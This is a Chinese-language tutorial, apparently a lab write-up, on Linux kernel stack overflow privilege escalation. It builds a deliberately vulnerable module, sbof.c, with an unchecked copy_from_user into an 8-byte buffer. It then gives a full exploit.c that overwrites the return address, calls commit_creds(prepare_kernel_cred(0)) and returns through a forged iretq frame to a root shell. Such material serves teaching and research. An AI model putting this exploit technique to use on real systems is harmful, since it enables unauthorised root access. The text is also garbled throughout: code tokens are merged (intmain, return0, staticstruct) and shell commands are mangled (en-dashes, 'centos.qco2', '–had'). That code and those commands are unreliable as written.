0x01 环境搭建

文件: centos6.9 x64位,linux-kernel-2.6.32.29 内核源码

工具: qemu

平台: archlinux

打开终端，创建一个使用10G 的qcow2 文件

Qemu-img create –fqcow2 centos.qcow2 10G

开始安装centos

Qemu-system-x86_64–hda centos.qco2 –m 1024M –boot –d –enable-kvm

等待系统安装完后，进入系统，安装gcc, make,wget 等编译所需的工具

从kernel.org 中下载linux-2.6.32.29 内核源码到centos 中

Tar –jxvflinux-2.6.32.29.tar.bz2 来解压

Cd linux-2.6.32.29

Zcat /boot/config>.config Makemenuconfig 来配置内核选项

                           


转到该处(Processor type and features-> 进去) 不选,即取消掉CONFIGCCSTACKPROTECTOR保护

之后推出，make && make modules_install&& makeinstall 来等待内核编译安装完

编译完成后，在内核源码目录下，有vmlinux 文件，将其传输到主机上

调试环境测试

Qemu-system-x86_64–had centos.qcow2 –m 1024M –enable-kvm –s –S

在另一个终端打开gdb

Gdb>file vmlinux

Gdb>target remote:1234

Gdb>c

这时centos 会正式启动，注意选择启动项

0x02 漏洞分析

   Sbof.c

 

   /*

    * Kernel stack overflow basics

    * https://blog.0x80.org/kernel-stack-overflows-basics/

    */

 

   # include <linux/kernel.h>

   # include <linux/module.h>

   # include <linux/proc_fs.h>

   # include <linux/string.h>

   # include <linux/vmalloc.h>

   # include <linux/sched.h>

   # include <linux/uaccess.h>

 

   struct proc_dir_entry *proc_file_entry;

   uint64_t rbx, rbp;

   // Buggy write handling

   intbuggy_write(struct file *file,

            constchar *buf,

            unsignedlong len) {

 

       char data[8];

       copy_from_user(data, buf, len);

       return len;

   }

 

   staticstruct file_operations buggy_proc_fops = {

       .write = buggy_write,

   };

 

   intinit_module()

   {

       printk(" module started\n");

       printk(" creating proc entry @ /proc/buggy\n");

 

       proc_file_entry = proc_create("buggy", 0666, NULL,&buggy_proc_fops);

 

       return0;

   }

 

   voidcleanup_module()

   {

       remove_proc_entry("buggy", NULL);

   }

   obj-m := sbof.o

 

   ROOTDIR  := /lib/modules/$(shelluname -r)/build

   default:

       $(MAKE) -C $(ROOTDIR) M=$(PWD) modules

在终端直接make 来生成sbof.ko 驱动模块文件

Insmod sbof.ko 来载入模块

Cat/sys/modules/sbof/section/.text

来查看sbof 模块的内存位置

将sbof.ko 传输到archlinux 中，并在gdb中

Gdb>add-symbols-filesbof.ko <内存位置>

Gdb> bsbof.ko:buggy_write

在buggy_write 位置下断点，可以方便的去调试

现在讲一下漏洞的情况

   intbuggy_write(struct file *file,

            constchar *buf,

            unsignedlong len) {

 

       char data[8];

       copy_from_user(data, buf, len);

       return len;

   }

可以看到在buggywrite 函数中copyfrom_user 函数讲用户传递来的数据buf复制到data 中，data位局部变量，在这一过程程序没有检查复制数据的大小，从而形成了溢出漏洞。

0x03 漏洞提权

用ida打开sbof.ko 模块


从中可以知道，栈的大小位0x20字节，我们要覆盖返回地址，所以就需要复制0x30 大小的数据，即0x20+8字节rbp + 8 字节返回地。

返回地址要设置位我们的payload 所在的内存位置，其payload 为commitcreds(preparekernel_cred(0)) 提权函数。、

获取commitcreds 和preparekernel_cred 函数的内存地址的方法为

Cat /sys/kallsyms|grep commit_creds

Cat /sys/kallsyms|grep prepare_kernel_cred

提权函数从内核空间到用户空间，这涉及到栈的问题，从内核空间通过iret 指令来返回到用户空间，iret 指令会反向弹出保存时的寄存器的数据，其形式为

   * |ss     | Lower

   * |rsp    |

   * |rflags |

   * |cs     |

   * |rip    |

由此，我们可以通过伪造伪造一个类似的frame 当iret 执行时，可以返回到rip 所指定的地址处继续执行。

0x04 获得shell

通过上述的思路，完成exploit.c

   #include <stdio.h>

   #include <stdlib.h>

   #include <sys/mman.h>

   #include <sys/stat.h>

   #include <fcntl.h>

   #include <string.h>

   #include <unistd.h>

   #include <stdint.h>

   #include <sys/user.h>

 

   #define STACK_SIZE (1024 * 1024)

   char ownstack[STACK_SIZE];

   struct fake_frame {

       void *rip;         // shell()

       uint64_t cs;       // %cs

       uint64_t rflags;   // rflags

       void *rsp;         // %rsp

       uint64_t ss;       // %ss

   } __attribute__((packed)) ff;

 

   #define KERNCALL __attribute__((regparm(3)))

   void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff81093000;

   void* (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81092b20;

 

   voidshell(void) {

       execl("/bin/sh", "sh", 0);

   }

 

   voidpayload(void) {

       commit_creds(prepare_kernel_cred(0));

       asm("mov $ff, %rsp;\n"

                "swapgs;\n"

                "iretq;");

   }

   voidsetup_ff(void) {

       asm("xorq %rax, %rax;\n"

            "movw %cs,%ax;\n"

            "movq %rax, ff+8;\n"

            "pushfq;   popq ff+16;\n"

            "movw %ss,%ax;\n"

            "movq %rax,ff+32;\n");

       ff.rip = &shell;

       ff.rsp = ownstack + (STACK_SIZE / 2);

   }

 

   intmain()

   {

       FILE *fd;

       char buf[8*6];

       memset (buf, 'A', sizeof (buf));

       *((void**) (buf+8*5)) = &payload;

       int ret = 0;

       unsignedlong addr;

       char dummy;

       char sname[512];

 

       // setup fake frame

       fprintf(stdout, "[+] preparing fake frame");

       setup_ff();

 

       // write payload

       fprintf(stdout, "[+] writing payload to /proc/buggy");

       fd = fopen("/proc/buggy", "w");

       if(fd == NULL) {

            perror("fopen()");

            return-1;

       }

       fwrite(buf, sizeof(buf), 1, fd);

       fclose(fd);

 

       return0;

   }
